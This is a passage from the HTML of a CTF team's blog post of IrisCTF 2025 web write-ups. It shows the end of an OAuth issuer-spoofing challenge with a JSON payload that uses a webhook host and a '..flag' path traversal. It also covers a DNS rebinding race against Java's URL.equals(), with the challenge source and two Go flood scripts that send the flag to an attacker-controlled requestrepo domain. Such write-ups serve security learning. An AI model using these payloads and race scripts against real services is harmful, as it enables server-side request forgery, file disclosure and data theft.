    <span class="k">await</span> <span class="nx">successfulLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">,</span> <span class="nx">userInfo</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Location</span><span class="dl">"</span><span class="p">,</span> <span class="s2">`/`</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">302</span><span class="p">);</span>
<span class="p">}));</span>
</pre></table></code></div></div><p>To abuse this, we want to return an <code class="language-plaintext highlighter-rouge">access_token</code> and a <code class="language-plaintext highlighter-rouge">token_type</code> which don’t really matter as long as they’re defined. Finally, the value of <code class="language-plaintext highlighter-rouge">sub</code> will be passed into our function which retrieves todos (vulnerable to the LFD).</p><h2 id="final-payload"><span class="mr-2">Final Payload</span><a href="#final-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"issuer"</span><span class="p">:</span><span class="s2">"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0"</span><span class="p">,</span><span class="nl">"authorization_endpoint"</span><span class="p">:</span><span class="s2">"https://bad-todo-web.chal.irisc.tf/auth_redirect"</span><span class="p">,</span><span class="nl">"token_endpoint"</span><span class="p">:</span><span class="s2">"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0"</span><span class="p">,</span><span class="nl">"userinfo_endpoint"</span><span class="p">:</span><span class="s2">"https://webhook.site/2c0beb1c-d788-4bb4-829d-6625f44347f0"</span><span class="p">,</span><span class="nl">"access_token"</span><span class="p">:</span><span class="s2">"lmao"</span><span class="p">,</span><span class="nl">"token_type"</span><span class="p">:</span><span class="s2">"Bearer"</span><span class="p">,</span><span class="nl">"sub"</span><span class="p">:</span><span class="s2">"..flag"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>By hosting this on our webhook and using that as our issuer URL when signing up, we can read the flag file.</p><p><code class="language-plaintext highlighter-rouge">irisctf{per_tenant_databases_are_a_cool_concept_indeed}</code></p><h1 id="webwebwebhookhook-16-solves">web/webwebhookhook (16 Solves)</h1><p>This was probably the most interesting challenge in my opinion. It took me some time and I went down a short rabbit hole of considering request smuggling vulnerabilities but it turns out the actual issue is in relation to Java’s <code class="language-plaintext highlighter-rouge">URL.equals()</code> which apparently does a DNS-level comparison (see <a href="https://news.ycombinator.com/item?id=21765788">here</a>).</p><h2 id="analyzing-the-source-3"><span class="mr-2">Analyzing the Source</span><a href="#analyzing-the-source-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">tf.irisc.chal.webwebhookhook.controller</span>

<span class="kn">import</span> <span class="nn">org.springframework.http.MediaType</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span>
<span class="kn">import</span> <span class="nn">org.springframework.ui.Model</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.*</span>
<span class="kn">import</span> <span class="nn">tf.irisc.chal.webwebhookhook.State</span>
<span class="kn">import</span> <span class="nn">tf.irisc.chal.webwebhookhook.StateType</span>
<span class="kn">import</span> <span class="nn">java.net.HttpURLConnection</span>
<span class="kn">import</span> <span class="nn">java.net.URI</span>

<span class="nd">@Controller</span>
<span class="kd">class</span> <span class="nc">MainController</span> <span class="o">{</span>

    <span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/"</span><span class="o">)</span>
    <span class="n">fun</span> <span class="nf">home</span><span class="o">(</span><span class="nl">model:</span> <span class="nc">Model</span><span class="o">):</span> <span class="nc">String</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"home.html"</span>
    <span class="o">}</span>

    <span class="nd">@PostMapping</span><span class="o">(</span><span class="s">"/webhook"</span><span class="o">)</span>
    <span class="nd">@ResponseBody</span>
    <span class="n">fun</span> <span class="nf">webhook</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="s">"hook"</span><span class="o">)</span> <span class="nl">hook_str:</span> <span class="nc">String</span><span class="o">,</span> <span class="nd">@RequestBody</span> <span class="nl">body:</span> <span class="nc">String</span><span class="o">,</span> <span class="nd">@RequestHeader</span><span class="o">(</span><span class="s">"Content-Type"</span><span class="o">)</span> <span class="nl">contentType:</span> <span class="nc">String</span><span class="o">,</span> <span class="nl">model:</span> <span class="nc">Model</span><span class="o">):</span> <span class="nc">String</span> <span class="o">{</span>
        <span class="kt">var</span> <span class="n">hook</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">hook_str</span><span class="o">).</span><span class="na">toURL</span><span class="o">();</span>
        <span class="k">for</span> <span class="o">(</span><span class="n">h</span> <span class="n">in</span> <span class="nc">State</span><span class="o">.</span><span class="na">arr</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">h</span><span class="o">.</span><span class="na">hook</span> <span class="o">==</span> <span class="n">hook</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">var</span> <span class="n">newBody</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="na">template</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"_DATA_"</span><span class="o">,</span> <span class="n">body</span><span class="o">);</span>
                <span class="kt">var</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">hook</span><span class="o">.</span><span class="na">openConnection</span><span class="o">()</span> <span class="n">as</span><span class="o">?</span> <span class="nc">HttpURLConnection</span><span class="o">;</span>
                <span class="k">if</span><span class="o">(</span><span class="n">conn</span> <span class="o">===</span> <span class="kc">null</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">requestMethod</span> <span class="o">=</span> <span class="s">"POST"</span><span class="o">;</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">doOutput</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">setFixedLengthStreamingMode</span><span class="o">(</span><span class="n">newBody</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">setRequestProperty</span><span class="o">(</span><span class="s">"Content-Type"</span><span class="o">,</span> <span class="n">contentType</span><span class="o">);</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">connect</span><span class="o">()</span>
                <span class="n">conn</span><span class="o">.</span><span class="na">outputStream</span><span class="o">.</span><span class="na">use</span> <span class="o">{</span> <span class="n">os</span> <span class="o">-&gt;</span>
                    <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">newBody</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">())</span>
                <span class="o">}</span>

                <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="na">response</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="s">"{\"result\": \"fail\"}"</span>
    <span class="o">}</span>

    <span class="nd">@PostMapping</span><span class="o">(</span><span class="s">"/create"</span><span class="o">,</span> <span class="n">consumes</span> <span class="o">=</span> <span class="o">[</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_JSON_VALUE</span><span class="o">])</span>
    <span class="nd">@ResponseBody</span>
    <span class="n">fun</span> <span class="nf">create</span><span class="o">(</span><span class="nd">@RequestBody</span> <span class="nl">body:</span> <span class="nc">StateType</span><span class="o">):</span> <span class="nc">String</span> <span class="o">{</span>
        <span class="k">for</span><span class="o">(</span><span class="n">h</span> <span class="n">in</span> <span class="nc">State</span><span class="o">.</span><span class="na">arr</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span><span class="o">(</span><span class="n">body</span><span class="o">.</span><span class="na">hook</span> <span class="o">==</span> <span class="n">h</span><span class="o">.</span><span class="na">hook</span><span class="o">)</span>
                <span class="k">return</span> <span class="s">"{\"result\": \"fail\"}"</span>
        <span class="o">}</span>
        <span class="nc">State</span><span class="o">.</span><span class="na">arr</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">body</span><span class="o">)</span>
        <span class="k">return</span> <span class="s">"{\"result\": \"ok\"}"</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>And that’s basically it! I love a short challenge that requires you to think outside the box and this definitely was the case here. You will notice that we iterate over every webhook in the array and then compare the URLs. If they are equal, we will send a request.</p><p>The trick here is knowing where the DNS resolves will occur. During the iteration it will compare the hook URL with our input and resolve the DNS here. Next, it replaces our template and finally it will do another DNS resolve to send the request.</p><p>The flag is stored in a webhook assigned to <code class="language-plaintext highlighter-rouge">example.com</code> which has IP address <code class="language-plaintext highlighter-rouge">93.184.215.14</code> and so what we would like here is for our domain to initially resolve to this IP (thus passing the equality check) but then change back to our webhook before it sends the request with the flag. This is known as a DNS rebinding attack.</p><p>We can expand the race window here by having a large body so the replace operation in the template takes a bit longer. I ended up having to write my exploits in Golang to achieve the race.</p><h2 id="final-payloads"><span class="mr-2">Final Payloads</span><a href="#final-payloads" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"bytes"</span>
        <span class="s">"encoding/json"</span>
        <span class="s">"fmt"</span>
        <span class="s">"net/http"</span>
        <span class="s">"sync"</span>
<span class="p">)</span>

<span class="k">const</span> <span class="p">(</span>
        <span class="n">url</span>   <span class="o">=</span> <span class="s">"https://webwebhookhook-5dbcb929250a3fff.i.chal.irisc.tf/webhook?hook=http://pwn.fl7mhi6b.requestrepo.com/admin"</span>
        <span class="n">value</span> <span class="o">=</span> <span class="s">"A"</span>
        <span class="n">size</span>  <span class="o">=</span> <span class="m">500000</span>
        <span class="n">workers</span> <span class="o">=</span> <span class="m">10</span> <span class="c">// Number of concurrent goroutines</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">data</span> <span class="o">:=</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
                <span class="s">"abc"</span><span class="o">:</span> <span class="n">repeat</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">size</span><span class="p">),</span>
        <span class="p">}</span>

        <span class="n">payload</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">json</span><span class="o">.</span><span class="n">Marshal</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="k">var</span> <span class="n">wg</span> <span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">workers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">wg</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="m">1</span><span class="p">)</span>
                <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">defer</span> <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
                        <span class="k">for</span> <span class="p">{</span>
                                <span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"application/json"</span><span class="p">,</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
                                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                                        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Error:"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
                                        <span class="k">continue</span>
                                <span class="p">}</span>
                                <span class="n">resp</span><span class="o">.</span><span class="n">Body</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
                                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Status:"</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">Status</span><span class="p">)</span>
                        <span class="p">}</span>
                <span class="p">}()</span>
        <span class="p">}</span>
        <span class="n">wg</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">repeat</span><span class="p">(</span><span class="n">s</span> <span class="kt">string</span><span class="p">,</span> <span class="n">count</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
        <span class="k">var</span> <span class="n">result</span> <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">result</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This <code class="language-plaintext highlighter-rouge">probe.go</code> script will consistently probe the webhook passing in my <code class="language-plaintext highlighter-rouge">http://pwn.fl7mhi6b.requestrepo.com/admin</code> which has an A record pointing to <code class="language-plaintext highlighter-rouge">93.184.215.14</code>.</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"bytes"</span>
        <span class="s">"encoding/json"</span>
        <span class="s">"fmt"</span>
        <span class="s">"math/rand"</span>
        <span class="s">"net/http"</span>
        <span class="s">"sync"</span>
        <span class="s">"time"</span>
<span class="p">)</span>

<span class="k">const</span> <span class="p">(</span>
        <span class="n">url</span>     <span class="o">=</span> <span class="s">"https://webwebhookhook-5dbcb929250a3fff.i.chal.irisc.tf/create"</span>
        <span class="n">workers</span> <span class="o">=</span> <span class="m">10</span> <span class="c">// Number of concurrent goroutines</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">rand</span><span class="o">.</span><span class="n">Seed</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">UnixNano</span><span class="p">())</span>
        <span class="k">var</span> <span class="n">wg</span> <span class="n">sync</span><span class="o">.</span><span class="n">WaitGroup</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">workers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">wg</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="m">1</span><span class="p">)</span>
                <span class="k">go</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">defer</span> <span class="n">wg</span><span class="o">.</span><span class="n">Done</span><span class="p">()</span>
                        <span class="k">for</span> <span class="p">{</span>
                                <span class="n">token</span> <span class="o">:=</span> <span class="n">generateToken</span><span class="p">(</span><span class="m">32</span><span class="p">)</span>
                                <span class="n">data</span> <span class="o">:=</span> <span class="k">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
                                        <span class="s">"hook"</span><span class="o">:</span>     <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"http://pwn.fl7mhi6b.requestrepo.com/%s"</span><span class="p">,</span> <span class="n">token</span><span class="p">),</span>
                                        <span class="s">"template"</span><span class="o">:</span> <span class="s">""</span><span class="p">,</span>
                                        <span class="s">"response"</span><span class="o">:</span> <span class="s">""</span><span class="p">,</span>
                                <span class="p">}</span>

                                <span class="n">payload</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">json</span><span class="o">.</span><span class="n">Marshal</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                                <span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"application/json"</span><span class="p">,</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
                                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                                        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Error:"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
                                        <span class="k">continue</span>
                                <span class="p">}</span>
                                <span class="n">resp</span><span class="o">.</span><span class="n">Body</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
                                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Status:"</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">Status</span><span class="p">)</span>
                        <span class="p">}</span>
                <span class="p">}()</span>
        <span class="p">}</span>
        <span class="n">wg</span><span class="o">.</span><span class="n">Wait</span><span class="p">()</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">generateToken</span><span class="p">(</span><span class="n">length</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
        <span class="k">const</span> <span class="n">charset</span> <span class="o">=</span> <span class="s">"abcdef0123456789"</span>
        <span class="n">result</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="n">length</span><span class="o">*</span><span class="m">2</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">result</span> <span class="p">{</span>
                <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">charset</span><span class="p">[</span><span class="n">rand</span><span class="o">.</span><span class="n">Intn</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">))]</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This <code class="language-plaintext highlighter-rouge">dns_refresh.go</code> will run in parallel and simply creates new webhooks with the same requestrepo link. The purpose of this is so that it will be forced to resolve the DNS again and refresh it.</p><p>Running them in parallel and then removing the A record pointing to <code class="language-plaintext highlighter-rouge">example.com</code> will eventually give us the flag when the TTL is surpassed.</p><p><code class="language-plaintext highlighter-rouge">irisctf{url_equals_rebind}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=irisctf 2025 Web Writeups - Ireland.RE&amp;url=https://ireland.re/posts/irisctf_2025/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=irisctf 2025 Web Writeups - Ireland.RE&amp;u=https://ireland.re/posts/irisctf_2025/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/irisctf_2025/&amp;text=irisctf 2025 Web Writeups - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/irisctf_2025/">irisctf 2025 Web Writeups</a><li><a href="/posts/idekctf_2024/">idekctf 2024 Web Writeups</a><li><a href="/posts/HitconCTF_2024/">Hitcon CTF 2024 RClonE</a><li><a href="/posts/UMassCTF2024/">UMassCTF 2024</a><li><a href="/posts/CursedCTF_2024/">CursedCTF 2024</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/CursedCTF_2024/"><div class="card-body"> <em class="timeago small" data-ts="1712275200" > 2024-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CursedCTF 2024</h3><div class="text-muted small"><p> Web - Hero’s Journey Challenge description Hero’s Journey consists of a website in which you can create a story by writing in text to different sections as depicted in the following image: So l...</p></div></div></a></div><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_CTF_2023_Web/"><div class="card-body"> <em class="timeago small" data-ts="1702857600" > 2023-12-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor CTF 2023 Web Challenges</h3><div class="text-muted small"><p> web/too-many-admins Downloading the source, we can see this is a PHP challenge. Just a single PHP file and the flag is located in the database (dump.sql). I immediately noticed the SQL injection h...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/idekctf_2024/" class="btn btn-outline-primary" prompt="Older"><p>idekctf 2024 Web Writeups</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
